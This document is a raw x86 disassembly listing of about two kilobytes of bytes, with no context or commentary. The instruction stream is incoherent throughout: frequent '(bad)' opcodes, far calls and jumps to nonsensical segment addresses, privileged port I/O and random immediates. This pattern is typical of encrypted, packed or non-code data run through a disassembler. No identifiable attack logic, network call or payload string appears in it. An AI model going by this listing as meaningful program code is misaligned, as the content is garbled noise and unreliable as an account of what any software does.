  4165b3:	lods   al,BYTE PTR ds:[esi]
  4165b4:	mov    al,0x8e
  4165b6:	dec    edx
  4165b7:	jno    0x416612
  4165b9:	add    cl,BYTE PTR [ebx+ebp*4]
  4165bc:	fld    DWORD PTR [edi]
  4165be:	jle    0x4165b5
  4165c0:	sub    edx,DWORD PTR [edx]
  4165c2:	imul   ebx,DWORD PTR [ebp-0x36],0x15
  4165c6:	xor    ecx,ecx
  4165c8:	retf   
  4165c9:	pop    ecx
  4165ca:	dec    ebp
  4165cb:	or     eax,0xc774809e
  4165d0:	in     al,0x94
  4165d2:	mov    cl,0x1a
  4165d4:	jnp    0x41662d
  4165d6:	ins    BYTE PTR es:[edi],dx
  4165d7:	xchg   DWORD PTR [eax+0x6b0709d3],esp
  4165dd:	sbb    eax,DWORD PTR [edi+0x50733179]
  4165e3:	pop    es
  4165e4:	ds adc al,0xf0
  4165e7:	add    eax,0x64e48446
  4165ec:	std    
  4165ed:	jns    0x4165e8
  4165ef:	xlat   BYTE PTR ds:[ebx]
  4165f0:	aam    0x90
  4165f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f3:	sbb    eax,0x3fdfed96
  4165f8:	inc    edi
  4165f9:	cmc    
  4165fa:	mov    ch,0x99
  4165fc:	out    dx,eax
  4165fd:	pop    ds
  4165fe:	into   
  4165ff:	sbb    bl,BYTE PTR [ecx-0x139db6df]
  416605:	pop    es
  416606:	xchg   ecx,eax
  416607:	retf   
  416608:	inc    edx
  416609:	push   ebp
  41660a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41660b:	into   
  41660c:	test   BYTE PTR [ecx],dh
  41660e:	dec    esp
  41660f:	adc    al,0x9d
  416611:	(bad)  ds:0x2b286a19
  416617:	push   ss
  416618:	sbb    DWORD PTR [esi],esi
  41661a:	fldcw  WORD PTR [edi]
  41661c:	imul   ecx,DWORD PTR [ebx-0x430dfdf0],0x4c
  416623:	sub    ebp,DWORD PTR [ebx+0xf]
  416626:	jp     0x416618
  416628:	std    
  416629:	fldlg2 
  41662b:	(bad)  
  41662c:	fbld   TBYTE PTR [ecx+0x1eabe446]
  416632:	imul   ebx,DWORD PTR [edi+ecx*8-0x49],0x33f2136d
  41663a:	dec    ecx
  41663b:	inc    edi
  41663c:	scas   eax,DWORD PTR es:[edi]
  41663d:	sub    BYTE PTR [edx+0x6f],0xee
  416641:	push   eax
  416642:	leave  
  416643:	mov    ch,0x35
  416645:	dec    ebp
  416646:	sub    BYTE PTR [eax],ch
  416648:	loopne 0x4166c2
  41664a:	sub    al,0x5d
  41664c:	jns    0x4166a3
  41664e:	(bad)  
  41664f:	(bad)  
  416650:	mov    al,ds:0x14bc9e8e
  416655:	out    0xbd,al
  416657:	ret    
  416658:	lods   eax,DWORD PTR ds:[esi]
  416659:	dec    esi
  41665a:	and    eax,0xe4e42e1c
  41665f:	cmp    ebp,DWORD PTR [edx]
  416661:	add    edx,DWORD PTR [edx+0x63309b13]
  416667:	adc    ah,BYTE PTR [edx-0x7a8e1a52]
  41666d:	ja     0x416627
  41666f:	fsub   DWORD PTR [ecx+0x9]
  416672:	push   cs
  416673:	sbb    ah,BYTE PTR [ecx]
  416675:	add    eax,0xa75c99e0
  41667a:	pop    esp
  41667b:	fstp   TBYTE PTR [esi+0x2e]
  41667e:	mov    eax,ds:0xe341799f
  416683:	clc    
  416684:	push   ebp
  416685:	loope  0x41663e
  416687:	mov    ecx,0x31cae35e
  41668c:	fst    QWORD PTR [esi-0x7d]
  41668f:	sbb    al,0xd
  416691:	inc    edx
  416692:	ret    
  416693:	add    DWORD PTR [eax+edx*4],ebx
  416696:	leave  
  416697:	dec    edx
  416698:	adc    eax,0x58e1322e
  41669d:	dec    ebp
  41669e:	and    dl,ah
  4166a0:	sub    ah,BYTE PTR [ecx-0x53]
  4166a3:	stc    
  4166a4:	adc    eax,0x105a4d1d
  4166a9:	ins    DWORD PTR es:[edi],dx
  4166aa:	leave  
  4166ab:	xor    al,0xe6
  4166ad:	mov    edx,0xcbc14e9a
  4166b2:	cld    
  4166b3:	mov    ecx,0xb5562699
  4166b8:	or     BYTE PTR [ebx+ecx*4+0x7d],dh
  4166bc:	sub    al,0x76
  4166be:	shl    BYTE PTR [ebp-0x11],0xd2
  4166c2:	sbb    al,0xdc
  4166c4:	xor    al,BYTE PTR [edx+ebp*1]
  4166c7:	inc    eax
  4166c8:	(bad)  
  4166c9:	retf   0xadc7
  4166cc:	jg     0x416685
  4166ce:	inc    edx
  4166cf:	push   ds
  4166d0:	jo     0x4166c3
  4166d2:	and    eax,0x74d5a177
  4166d7:	rcl    ebp,0x57
  4166da:	fimul  DWORD PTR [ebp-0x57]
  4166dd:	fisttp QWORD PTR [eax+0x1b0e86ed]
  4166e3:	cs jo  0x4166b8
  4166e6:	xor    ebp,edx
  4166e8:	sbb    al,0x8
  4166ea:	shl    BYTE PTR [ecx-0x19],0xd0
  4166ee:	inc    eax
  4166ef:	or     ebp,ebx
  4166f1:	test   DWORD PTR [edi+0x705dda72],0x3b5677d2
  4166fb:	xlat   BYTE PTR ds:[ebx]
  4166fc:	cld    
  4166fd:	and    ch,BYTE PTR [edx]
  4166ff:	call   0x372:0x5eb6a1be
  416706:	sub    al,0x7f
  416708:	push   ss
  416709:	push   ss
  41670a:	ds clc 
  41670c:	push   0x43
  41670e:	jle    0x416768
  416710:	mov    bh,0xaa
  416712:	adc    eax,0x5fabe40a
  416717:	jae    0x41672c
  416719:	dec    esp
  41671a:	xor    eax,0xc7e9526e
  41671f:	mov    WORD PTR [edi-0xd4ecdbf],ss
  416725:	jle    0x416780
  416727:	out    0x8d,al
  416729:	ins    DWORD PTR es:[edi],dx
  41672a:	jbe    0x416724
  41672c:	push   edi
  41672d:	(bad)  
  41672e:	pop    ds
  41672f:	test   eax,0xd8227db0
  416734:	dec    esi
  416735:	push   0x238ef2e0
  41673a:	and    DWORD PTR [eiz*1-0x880ed08],ecx
  416741:	js     0x41675f
  416743:	gs leave 
  416745:	dec    edx
  416746:	repnz cmp DWORD PTR [edi-0x62779e82],ebx
  41674d:	call   0xcd38:0x3c4da09c
  416754:	(bad)  
  416755:	int3   
  416756:	push   ss
  416757:	jmp    FWORD PTR [edx+0xb]
  41675a:	test   DWORD PTR [ebp-0x342e15c2],ebx
  416760:	fisubr DWORD PTR [esi+0x7394a1ba]
  416766:	mov    edi,0x6db5729e
  41676b:	pop    edx
  41676c:	ret    0x27d0
  41676f:	sahf   
  416770:	xchg   ebx,eax
  416771:	test   DWORD PTR [eax+esi*4+0x5169fb0d],edx
  416778:	mov    eax,ds:0x171236ef
  41677d:	mov    edx,0x67d3b427
  416782:	mov    ds:0xd7fc9fc8,al
  416787:	pop    esi
  416788:	mov    bh,0x7e
  41678a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41678c:	or     eax,0x1df159aa
  416791:	jns    0x41679f
  416793:	dec    ecx
  416794:	int3   
  416795:	or     bh,BYTE PTR [esi+ebp*1+0x32]
  416799:	imul   ecx,DWORD PTR [ecx-0x415a9988],0x11326e7d
  4167a3:	jns    0x41674b
  4167a5:	sti    
  4167a6:	pop    edi
  4167a7:	ss call 0x7223:0x17b9a626
  4167af:	sahf   
  4167b0:	lods   eax,DWORD PTR ds:[esi]
  4167b1:	lods   eax,DWORD PTR ds:[esi]
  4167b2:	cmp    eax,0x8ec32f86
  4167b7:	push   cs
  4167b8:	pop    es
  4167b9:	(bad)  
  4167ba:	mov    dl,0xec
  4167bc:	inc    ebp
  4167bd:	jae    0x416822
  4167bf:	push   ebp
  4167c0:	cmc    
  4167c1:	(bad)  
  4167c2:	out    0xc,al
  4167c4:	sbb    ch,BYTE PTR [ecx]
  4167c6:	lock pop ecx
  4167c8:	cwde   
  4167c9:	lods   al,BYTE PTR ds:[esi]
  4167ca:	inc    ecx
  4167cb:	mov    BYTE PTR [ebx+0x27d8c66a],0x17
  4167d2:	imul   BYTE PTR [ebp+0x3a]
  4167d5:	pop    esi
  4167d6:	mov    dh,0xd8
  4167d8:	sbb    ah,ch
  4167da:	inc    esp
  4167db:	(bad)  
  4167dc:	pop    ecx
  4167dd:	pop    esp
  4167de:	inc    edi
  4167df:	(bad)  
  4167e0:	sub    BYTE PTR [ecx],0x77
  4167e3:	jne    0x416862
  4167e5:	or     dl,cl
  4167e7:	sub    eax,0xd2220da9
  4167ec:	sub    eax,DWORD PTR [eax+0x56d636ee]
  4167f2:	repz sub DWORD PTR [ebp-0x6d],ebx
  4167f6:	push   cs
  4167f7:	lods   al,BYTE PTR ds:[esi]
  4167f8:	mov    edx,0x390bcf7b
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	jle    0x41682c
  41681a:	push   es
  41681b:	outs   dx,BYTE PTR ds:[esi]
  41681c:	jbe    0x416841
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x41680d
  416825:	mov    ah,0x5c
  416827:	stos   DWORD PTR es:[edi],eax
  416828:	es push ss
  41682a:	jl     0x4167c7
  41682c:	neg    BYTE PTR [ecx+0x6302782f]
  416832:	sbb    al,0x91
  416834:	mov    ebp,0xb3eb11ce
  416839:	gs scas al,BYTE PTR es:[edi]
  41683b:	or     DWORD PTR [edx],0x2c
  41683e:	cwde   
  41683f:	jno    0x416838
  416841:	gs jb  0x4167eb
  416844:	sub    al,0xd3
  416846:	mov    cl,0x48
  416848:	jne    0x41688e
  41684a:	mov    ds:0x309c07b9,eax
  41684f:	add    DWORD PTR [ecx],esp
  416851:	outs   dx,DWORD PTR ds:[esi]
  416852:	mov    ds:0xd36d5b9,eax
  416857:	call   0x945d:0x4b4116a9
  41685e:	xchg   ebx,eax
  41685f:	mov    eax,DWORD PTR [ecx]
  416861:	ret    
  416862:	loope  0x4167f3
  416864:	jmp    0xe050c74c
  416869:	inc    edx
  41686a:	daa    
  41686b:	sub    eax,0xf3e35a53
  416870:	les    esi,FWORD PTR [ebx+ebx*4]
  416873:	dec    esi
  416874:	ficom  DWORD PTR fs:[edx+0x6d]
  416878:	mov    esp,0x8f2d7118
  41687d:	push   eax
  41687e:	jp     0x41688e
  416880:	mul    BYTE PTR [eax-0x39]
  416883:	lock retf 0xbbd5
  416887:	in     eax,dx
  416888:	pop    ds
  416889:	(bad)  
  41688a:	jmp    0x95f9:0x8cba1c4e
  416891:	and    eax,esi
  416893:	mov    edi,0x410744d0
  416898:	push   edx
  416899:	sbb    DWORD PTR [edx],edx
  41689b:	inc    ebx
  41689c:	xchg   ecx,eax
  41689d:	loope  0x41690c
  41689f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168a0:	or     esi,ecx
  4168a2:	cmp    bl,BYTE PTR [ebp-0x2e]
  4168a5:	mov    edx,0xf413fb4c
  4168aa:	stos   DWORD PTR es:[edi],eax
  4168ab:	and    eax,0x69d87d50
  4168b0:	fwait
  4168b1:	jge    0x4168b4
  4168b3:	ret    0x9992
  4168b6:	rol    BYTE PTR [edx],0x10
  4168b9:	outs   dx,BYTE PTR ds:[esi]
  4168ba:	shl    BYTE PTR [edi+eiz*4],1
  4168bd:	xchg   esi,eax
  4168be:	aad    0xba
  4168c0:	dec    ecx
  4168c1:	stc    
  4168c2:	xor    esi,edi
  4168c4:	loopne 0x416926
  4168c6:	ja     0x41689a
  4168c8:	xor    BYTE PTR [ecx-0x45],0x44
  4168cc:	jl     0x416883
  4168ce:	fbld   TBYTE PTR [edx+0x13]
  4168d1:	mov    ebp,esi
  4168d3:	add    ch,bl
  4168d5:	call   0x1f49:0xc2f47086
  4168dc:	dec    ecx
  4168dd:	rcr    bl,cl
  4168df:	loop   0x4168e3
  4168e1:	mov    eax,DWORD PTR [ebx+0x657ff560]
  4168e7:	jnp    0x416966
  4168e9:	cmp    BYTE PTR [ecx+ebp*1],dh
  4168ec:	call   0x1d8f7493
  4168f1:	and    cl,BYTE PTR [edi-0x17]
  4168f4:	fldenv [eax+0x28]
  4168f7:	mov    al,0x4d
  4168f9:	lahf   
  4168fa:	push   ecx
  4168fb:	jmp    0x55ec:0x1e7aad4b
  416902:	fidivr WORD PTR [ebx]
  416904:	xor    DWORD PTR [ebx+0x63],ecx
  416907:	hlt    
  416908:	sbb    al,0x3d
  41690a:	sbb    al,0xf8
  41690c:	or     BYTE PTR [ebp+0x17046da2],bl
  416912:	(bad)  
  416913:	jle    0x4168cb
  416915:	inc    esp
  416916:	cmp    bh,BYTE PTR [esi-0x74effc9b]
  41691c:	cdq    
  41691d:	xchg   DWORD PTR [edx+0x10],edi
  416920:	int3   
  416921:	mov    eax,ds:0xfe0eac53
  416926:	push   esp
  416927:	cmp    eax,esi
  416929:	pop    ebx
  41692a:	in     al,0x77
  41692c:	inc    ebx
  41692d:	aaa    
  41692e:	add    esp,DWORD PTR [esi+0x2448ec05]
  416934:	aad    0xe8
  416936:	lds    ebx,FWORD PTR [edi+0x7bd3650]
  41693c:	xchg   ecx,eax
  41693d:	outs   dx,DWORD PTR ds:[esi]
  41693e:	pop    edx
  41693f:	popa   
  416940:	push   ds
  416941:	sub    edx,eax
  416943:	(bad)
  416946:	mov    ecx,0x82675e0
  41694b:	push   ecx
  41694c:	mov    esi,0x5af51549
  416951:	pop    ebx
  416952:	mov    dh,0xa5
  416954:	je     0x4169b3
  416956:	mov    dl,0xf6
  416958:	aas    
  416959:	cdq    
  41695a:	cmp    al,0xbb
  41695c:	cdq    
  41695d:	ja     0x416951
  41695f:	(bad)  
  416960:	pop    esi
  416961:	jmp    0x2497d4d7
  416966:	test   DWORD PTR [ecx+edi*8-0x7e],ecx
  41696a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41696b:	aas    
  41696c:	sti    
  41696d:	imul   edx,DWORD PTR [ebp-0x62],0xb69fc8f6
  416974:	xchg   BYTE PTR [edi],ch
  416976:	xor    BYTE PTR [ebp+0x2adc8a0],dl
  41697c:	in     al,0xa4
  41697e:	mov    al,ds:0xf606ff71
  416983:	ja     0x4169c2
  416985:	inc    esp
  416986:	push   ebx
  416987:	mov    al,0x9d
  416989:	icebp  
  41698a:	inc    BYTE PTR [edx-0x675f99fa]
  416990:	cmp    ch,ch
  416992:	jo     0x4169b7
  416994:	and    al,0xd0
  416996:	inc    ebx
  416997:	or     eax,0x61d7edc5
  41699c:	aam    0x50
  41699e:	test   DWORD PTR [edx],0x43377d86
  4169a4:	xchg   edi,eax
  4169a5:	in     al,0x6f
  4169a7:	test   eax,0x816143bf
  4169ac:	add    ebx,DWORD PTR [eax+0x2bcd9fda]
  4169b2:	js     0x4169a2
  4169b4:	out    dx,al
  4169b5:	test   DWORD PTR [esi-0x6d6bc94],ebx
  4169bb:	outs   dx,BYTE PTR ds:[esi]
  4169bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169bd:	add    DWORD PTR [bp-0x3746],edx
  4169c2:	iret   
  4169c3:	shr    ah,0x7c
  4169c6:	xor    eax,0x3c4126d
  4169cb:	bnd ret 0x219b
  4169cf:	ins    BYTE PTR es:[edi],dx
  4169d0:	mov    edi,0xaf31decd
  4169d5:	sbb    ebx,DWORD PTR [edx-0x7]
  4169d8:	(bad)  [eax]
  4169da:	data16 fcmovb st,st(3)
  4169dd:	cs pop ecx
  4169df:	mov    al,ds:0xcd6a72cd
  4169e4:	ins    BYTE PTR es:[edi],dx
  4169e5:	add    al,0xf9
  4169e7:	icebp  
  4169e8:	sub    cl,0x38
  4169eb:	pop    ds
  4169ec:	jge    0x416996
  4169ee:	cli    
  4169ef:	aad    0x72
  4169f1:	mov    bl,0x9
  4169f3:	fisttp DWORD PTR [edx+ecx*2]
  4169f6:	jns    0x416a16
  4169f8:	sbb    bl,ch
  4169fa:	mov    cs,WORD PTR [ecx-0x7e]
  4169fd:	jge    0x416a3b
  4169ff:	in     eax,dx
  416a00:	mov    edi,0xa90fc24d
  416a05:	dec    esi
  416a06:	sub    eax,0x776c30cd
  416a0b:	cmp    eax,0x204dbbc0
  416a10:	(bad)  
  416a11:	test   al,0x49
  416a13:	std    
  416a14:	out    0xaf,eax
  416a16:	dec    esp
  416a17:	push   edi
  416a18:	(bad)  
  416a19:	jmp    0x4e9c2010
  416a1e:	ins    DWORD PTR es:[edi],dx
  416a1f:	cmp    DWORD PTR cs:[esi],esp
  416a22:	stos   BYTE PTR es:[edi],al
  416a23:	xchg   BYTE PTR [ecx+0x37],bh
  416a26:	add    esi,DWORD PTR [esi]
  416a28:	retf   0x9a0b
  416a2b:	(bad)  
  416a2c:	dec    esi
  416a2d:	mov    ds:0x464ce0b1,eax
  416a32:	cmp    al,0xa3
  416a34:	stos   DWORD PTR es:[edi],eax
  416a35:	test   DWORD PTR [eax],ecx
  416a37:	cmp    al,0xab
  416a39:	push   0x70
  416a3b:	std    
  416a3c:	in     eax,dx
  416a3d:	cli    
  416a3e:	jae    0x4169ef
  416a40:	mov    ah,0xa
  416a42:	jge    0x416a18
  416a44:	sahf   
  416a45:	seta   BYTE PTR [esp+edi*2]
  416a49:	pop    es
  416a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a4b:	mov    BYTE PTR [edx],dl
  416a4d:	mov    cl,0x86
  416a4f:	fisttp WORD PTR [edi+0x61]
  416a52:	outs   dx,BYTE PTR ds:[esi]
  416a53:	push   ss
  416a54:	pop    edx
  416a55:	imul   esi,DWORD PTR [eax-0x22202b89],0xffffffd7
  416a5c:	push   esp
  416a5d:	mul    BYTE PTR [eax-0x27c7e11a]
  416a63:	adc    edx,esp
  416a65:	or     DWORD PTR [edx-0x16],esi
  416a68:	push   ecx
  416a69:	and    DWORD PTR ds:0xbffb1677,eax
  416a6f:	ror    DWORD PTR [edi],1
  416a71:	mov    edx,DWORD PTR [eax]
  416a73:	repnz adc BYTE PTR [ecx],dh
  416a76:	inc    eax
  416a77:	or     ch,dl
  416a79:	sub    al,0xe0
  416a7b:	mov    BYTE PTR [ecx],cl
  416a7d:	imul   ebx,ebx,0x3
  416a80:	pop    esp
  416a81:	or     BYTE PTR [edx+0x781f280],bl
  416a87:	mov    al,ds:0x9621293f
  416a8c:	cli    
  416a8d:	add    bh,ch
  416a8f:	les    edx,FWORD PTR [eax]
  416a91:	and    esi,DWORD PTR fs:[eax+ebx*4]
  416a95:	(bad)  
  416a96:	xor    eax,0xe7ebbbe7
  416a9b:	or     ah,dh
  416a9d:	(bad)  
  416a9e:	and    ah,BYTE PTR [esi+0x4e]
  416aa1:	rol    BYTE PTR gs:[ebx-0x68],cl
  416aa5:	outs   dx,DWORD PTR ds:[esi]
  416aa6:	lahf   
  416aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aa8:	mov    dl,ch
  416aaa:	jne    0x416a52
  416aac:	test   eax,0x4f2d3b27
  416ab1:	or     BYTE PTR [ebx-0x36],bh
  416ab4:	xor    BYTE PTR [eax],cl
  416ab6:	jo     0x416aab
  416ab8:	mov    ebx,0xf631a53
  416abd:	push   ss
  416abe:	or     BYTE PTR [ebx-0x4c1603bb],cl
  416ac4:	add    al,BYTE PTR [eax]
  416ac6:	add    al,dl
  416ac8:	ret    0xcfc4
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xf764ff75
  416ad4:	pushf  
  416ad5:	scas   al,BYTE PTR es:[edi]
  416ad6:	mov    al,0x93
  416ad8:	and    BYTE PTR [edi+0x78],bh
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b25
  416ae0:	dec    esp
  416ae1:	xchg   esi,eax
  416ae2:	ret    
  416ae3:	sub    al,0xeb
  416ae5:	dec    esi
  416ae6:	retf   0xf6dd
  416ae9:	leave  
  416aea:	fisttp WORD PTR [edi]
  416aec:	lods   eax,DWORD PTR ds:[esi]
  416aed:	sbb    eax,0x6ffe42f
  416af2:	mov    BYTE PTR [esi+0x229dc826],dl
  416af8:	dec    ecx
  416af9:	ret    
  416afa:	lds    ebx,FWORD PTR [eax-0x35]
  416afd:	ins    BYTE PTR es:[edi],dx
  416afe:	in     al,dx
  416aff:	xchg   edi,eax
  416b00:	dec    esp
  416b01:	in     al,dx
  416b02:	mov    esp,0x7212f2e7
  416b07:	stc    
  416b08:	cmp    eax,0x7b8dc610
  416b0d:	dec    eax
  416b0e:	mov    ds:0xa8546cb8,al
  416b13:	daa    
  416b14:	push   ebx
  416b15:	or     eax,0xc2709da3
  416b1a:	pop    ebp
  416b1b:	enter  0x8e73,0x57
  416b1f:	popa   
  416b20:	fnsave [edx-0x4cd24d23]
  416b26:	dec    ebx
  416b27:	rcl    bh,0xed
  416b2a:	cmp    dh,cl
  416b2c:	repnz or al,0x34
  416b2f:	pop    ss
  416b30:	or     al,0x4
  416b32:	sbb    DWORD PTR [edx-0x54],ebp
  416b35:	sub    al,0x7d
  416b37:	mov    al,BYTE PTR [esp+esi*4-0x42d2474f]
  416b3e:	xor    esp,eax
  416b40:	cmp    eax,0xbca6a725
  416b45:	ror    BYTE PTR [eax],0x9b
  416b48:	sbb    dh,BYTE PTR [edx-0x69]
  416b4b:	pop    ebx
  416b4c:	push   esi
  416b4d:	mov    esi,0xd32505b0
  416b52:	pop    ss
  416b53:	xor    DWORD PTR [esp+eiz*2+0x4593833b],edx
  416b5a:	sahf   
  416b5b:	or     DWORD PTR [edx+0x2c03df1a],edi
  416b61:	addr16 mul cl
  416b64:	les    esi,FWORD PTR [edi]
  416b66:	sub    eax,0x56d5d3a8
  416b6b:	mov    esi,0x685c13a9
  416b70:	xchg   ebx,eax
  416b71:	pop    esi
  416b72:	pop    edi
  416b73:	mov    edi,0x42791275
  416b78:	mov    cl,dl
  416b7a:	sahf   
  416b7b:	lods   eax,DWORD PTR ds:[esi]
  416b7c:	mov    eax,0x6071aaab
  416b81:	cmc    
  416b82:	ror    BYTE PTR [edx+esi*1+0x4234bdb8],cl
  416b89:	out    0x4f,eax
  416b8b:	jg     0x416b30
  416b8d:	pushf  
  416b8e:	sti    
  416b8f:	fimul  DWORD PTR [esi]
  416b91:	inc    edi
  416b92:	aas    
  416b93:	scas   eax,DWORD PTR es:[edi]
  416b94:	loopne 0x416b8e
  416b96:	sbb    eax,DWORD PTR [edx]
  416b98:	jne    0x416bab
  416b9a:	mov    BYTE PTR [ecx],dh
  416b9c:	mov    DWORD PTR [eax],eax
  416b9e:	test   DWORD PTR [ebp+0x7304b399],esi
  416ba4:	sar    BYTE PTR ds:0x8f1a9147,cl
  416baa:	dec    ecx
  416bab:	and    al,0x96
  416bad:	and    BYTE PTR [ebx],al
  416baf:	fidivr DWORD PTR [esi+0x3e]
  416bb2:	dec    ebp
  416bb3:	aaa    
  416bb4:	call   0x96714db0
  416bb9:	test   BYTE PTR [edx+0x7],ch
  416bbc:	imul   esp,DWORD PTR [edx],0xffffffcf
  416bbf:	cdq    
  416bc0:	ret    0x8c47
  416bc3:	mov    ah,BYTE PTR [edi+ebx*2-0x62]
  416bc7:	add    al,ch
  416bc9:	pop    eax
  416bca:	xchg   edx,eax
  416bcb:	sub    BYTE PTR [ecx+eax*8+0x504e6a64],al
  416bd2:	shl    DWORD PTR [esi],1
  416bd4:	mov    ebx,0xbd05af47
  416bd9:	pusha  
  416bda:	fmul   DWORD PTR [esi+0x4e]
  416bdd:	int3   
  416bde:	jo     0x416b65
  416be0:	and    dl,BYTE PTR [ebx+0x61]
  416be3:	inc    ebp
  416be4:	and    BYTE PTR [ebp-0x9],0x1c
  416be8:	xor    ecx,DWORD PTR [ebp-0x27734e04]
  416bee:	scas   al,BYTE PTR es:[edi]
  416bef:	sbb    DWORD PTR [ebp-0x70ba55d5],0x970db908
  416bf9:	and    DWORD PTR [eax-0x78999453],edi
  416bff:	xchg   ecx,eax
  416c00:	outs   dx,BYTE PTR es:[esi]
  416c02:	adc    ch,BYTE PTR [edx+0x6380324d]
  416c08:	or     eax,0x5ee0c18a
  416c0d:	jae    0x416bed
  416c0f:	loope  0x416c16
  416c11:	mov    dl,0x36
  416c13:	(bad)  [esi]
  416c15:	mov    ecx,0xffda8f4c
  416c1a:	pop    ss
  416c1b:	adc    bl,BYTE PTR [edx-0x6]
  416c1e:	(bad)  
  416c20:	mov    edx,0x7a45bd02
  416c25:	sbb    edi,DWORD PTR [ebx-0x7e2fb263]
  416c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c2c:	and    dh,BYTE PTR [ebx+ebp*1]
  416c2f:	adc    DWORD PTR [ebx],ecx
  416c31:	retf   
  416c32:	xchg   esi,eax
  416c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c34:	mov    cl,0xc9
  416c36:	ror    DWORD PTR [eax+0x3f],cl
  416c39:	fwait
  416c3a:	jb     0x416bcb
  416c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c3d:	xor    BYTE PTR [eax+eiz*4+0x7c338f7],ah
  416c44:	add    cl,BYTE PTR [edx-0x75b45025]
  416c4a:	cmp    BYTE PTR [edx-0x44512adb],0xe0
  416c51:	pop    ecx
  416c52:	into   
  416c53:	mov    esi,0xd1b89a8d
  416c58:	jecxz  0x416c09
  416c5a:	out    0x4d,eax
  416c5c:	rcl    esp,cl
  416c5e:	into   
  416c5f:	mov    eax,0x52e55a81
  416c64:	jmp    0xf0da:0x134b9891
  416c6b:	cwde   
  416c6c:	jp     0x416c60
  416c6e:	pop    esi
  416c6f:	shl    ah,1
  416c71:	pop    ss
  416c72:	leave  
  416c73:	xchg   edi,eax
  416c74:	sbb    DWORD PTR [edx],ebp
  416c76:	or     al,0xc9
  416c78:	fdiv   DWORD PTR [edx+0x37b3d82]
  416c7e:	add    edi,DWORD PTR [eax+0x5e]
  416c81:	lods   eax,DWORD PTR ds:[esi]
  416c82:	and    dl,dl
  416c84:	and    eax,0xb583b889
  416c89:	or     eax,0x417e885d
  416c8e:	or     edx,DWORD PTR [edx]
  416c90:	inc    ebx
  416c91:	jbe    0x416c61
  416c93:	xchg   edx,eax
  416c94:	test   al,0xe8
  416c96:	dec    ecx
  416c97:	xchg   edi,eax
  416c98:	dec    esp
  416c99:	jecxz  0x416cbd
  416c9b:	cmp    DWORD PTR [edi+0x207a65bd],0xfffffff1
  416ca2:	sar    ah,1
  416ca4:	mov    esi,0x909d502
  416ca9:	fistp  WORD PTR [ebx]
  416cab:	push   ebp
  416cac:	xor    cl,BYTE PTR [ebp-0x3c56df76]
  416cb2:	cmp    al,BYTE PTR [edi+0x1d]
  416cb5:	inc    edi
  416cb6:	push   edi
  416cb7:	sbb    DWORD PTR [edi-0x5ed2df7f],ebx
  416cbd:	test   al,0x42
  416cbf:	xor    DWORD PTR [eax-0x7ac7d009],ebx
  416cc5:	cmp    DWORD PTR [edx+0x175e4527],edx
  416ccb:	mov    esi,0x60ef8909
  416cd0:	leave  
  416cd1:	fisubr WORD PTR [edi]
  416cd3:	popa   
  416cd4:	inc    edi
  416cd5:	inc    edx
  416cd6:	enter  0x8ffe,0xae
  416cda:	xchg   dh,dl
  416cdc:	aas    
  416cdd:	(bad)  
  416cde:	rol    DWORD PTR [edx],1
  416ce0:	mov    dh,0xab
  416ce2:	or     eax,0xaa8e9785
  416ce7:	pop    ecx
  416ce8:	popa   
  416ce9:	fld    QWORD PTR [esi+0x498a13a7]
  416cef:	cmp    BYTE PTR ss:[eax-0x1792544a],al
  416cf6:	bound  edi,QWORD PTR [eax]
  416cf8:	add    ch,ch
  416cfa:	jl     0x416ca8
  416cfc:	jns    0x416d6b
  416cfe:	inc    eax
  416cff:	subps  xmm1,XMMWORD PTR [ecx-0x36f193b8]
  416d06:	out    dx,al
  416d07:	iret   
  416d08:	cmp    eax,DWORD PTR [ebx-0x28b4b7e6]
  416d0e:	mov    al,0x1e
  416d10:	in     eax,dx
  416d11:	mov    ebp,0xd9549be
  416d16:	xchg   BYTE PTR [eax+edi*8],bh
  416d19:	inc    edx
  416d1a:	mov    ebx,0x1f553d69
  416d1f:	lds    ebp,FWORD PTR [edi+0x73]
  416d22:	pop    ds
  416d23:	pushf  
  416d24:	sbb    al,0x74
  416d26:	jno    0x416ccf
  416d28:	fild   DWORD PTR [ebx+0x27a8a40d]
  416d2e:	jmp    0x65a2:0xc4c23eda
  416d35:	add    dl,BYTE PTR [esi]
  416d37:	push   esp
  416d38:	pop    esp
  416d39:	ss dec ebp
  416d3b:	into   
  416d3c:	lds    ebx,FWORD PTR [ebx+ebp*1+0x27]
  416d40:	ins    BYTE PTR es:[edi],dx
  416d41:	rcr    DWORD PTR [ebx+0x4d8f236c],1
  416d47:	mov    edi,DWORD PTR [eax+eiz*4+0x3e0cb8fd]
  416d4e:	push   ebp
  416d4f:	outs   dx,DWORD PTR ds:[esi]
  416d50:	rcl    BYTE PTR [eax],0xca
  416d53:	dec    esi
  416d54:	loope  0x416dcd
  416d56:	add    eax,0x1a1a27c2
  416d5b:	into   
  416d5c:	pop    ds
  416d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d5e:	sub    eax,0xf2c35664
  416d63:	stc    
  416d64:	cvttps2pi mm3,QWORD PTR [ecx]
  416d67:	add    eax,0xba6e62fe
  416d6c:	pop    edi
  416d6d:	(bad)  
  416d6f:	sbb    BYTE PTR [esi],0x97
  416d72:	test   DWORD PTR [ebx+0x42a0b3df],0x4d8ba877
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
